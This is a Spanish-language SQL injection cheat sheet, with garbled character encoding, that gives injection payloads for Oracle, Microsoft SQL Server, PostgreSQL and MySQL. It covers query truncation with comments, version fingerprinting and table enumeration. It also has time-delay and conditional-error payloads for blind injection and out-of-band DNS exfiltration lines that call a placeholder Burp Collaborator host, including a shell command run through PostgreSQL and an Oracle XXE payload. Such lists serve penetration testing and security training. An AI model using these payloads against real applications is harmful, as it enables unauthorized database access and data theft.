üïµÔ∏è SQL Injection Cheat SheetEsta gu√≠a contiene la sintaxis esencial para realizar diversas tareas durante ataques de Inyecci√≥n SQL en diferentes motores de bases de datos.

üßµ Concatenaci√≥n de CadenasIdeal para unir fragmentos de texto o resultados de consultas.

Motor   Sintaxis

Oracle  `'foo'

Microsoft 'foo'+'bar'

PostgreSQL`'foo'

MySQL  'foo' 'bar' (espacio) o CONCAT('foo','bar')

‚úÇÔ∏è Subcadenas (Substring)

Extrae una parte de un texto. (El √≠ndice empieza en 1).

MotorComandoOracleSUBSTR('foobar', 4, 2)

MicrosoftSUBSTRING('foobar', 4, 2)

PostgreSQLSUBSTRING('foobar', 4, 2)

MySQLSUBSTRING('foobar', 4, 2)

üí¨ Comentarios

Sirven para "cortar" el resto de la consulta original.

Oracle: --comentario

Microsoft: --comentario o /*comentario*/

PostgreSQL: --comentario o /*comentario*/

MySQL: #comentario o -- comentario (n√≥tese el espacio despu√©s del guion).

üè∑Ô∏è Versi√≥n de la Base de Datos

Identificar el software es el primer paso para ataques espec√≠ficos.

Motor  Consulta

Oracle  SELECT banner FROM v$version

Microsoft SELECT @@version

PostgreSQLSELECT version()

MySQLSELECT @@version

üìÇ Contenido de la Base de Datos

Listar tablas y columnas para saber d√≥nde buscar datos.

Oracle:

 SQL

 SELECT * FROM all_tables

SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME'

Microsoft / PostgreSQL / MySQL:

SQLSELECT * FROM information_schema.tables

SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'

‚è±Ô∏è Retardos de Tiempo (Time Delays)

√ötil para ataques Blind SQLi. Si la respuesta tarda, la condici√≥n es verdadera.

Motor Comando (10 segundos)

Oracle dbms_pipe.receive_message(('a'),10)

Microsoft WAITFOR DELAY '0:0:10'

PostgreSQL SELECT pg_sleep(10)

MySQLSELECT SLEEP(10)

‚ö†Ô∏è Errores Condicionales

Fuerza un error (como divisi√≥n por cero) si se cumple una condici√≥n.

Oracle: SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual

Microsoft: SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END

PostgreSQL: 1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)

MySQL: SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')


üåê Consultas DNS (DNS Lookup)

Para exfiltrar datos cuando no hay respuesta visible ni tiempos de espera.

Microsoft: exec master..xp_dirtree '//SUBDOMAIN.burpcollaborator.net/a'

PostgreSQL: copy (SELECT '') to program 'nslookup SUBDOMAIN.burpcollaborator.net'

Oracle (XXE):

SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://SUBDOMAIN/"> %remote;]>'),'/l') FROM dual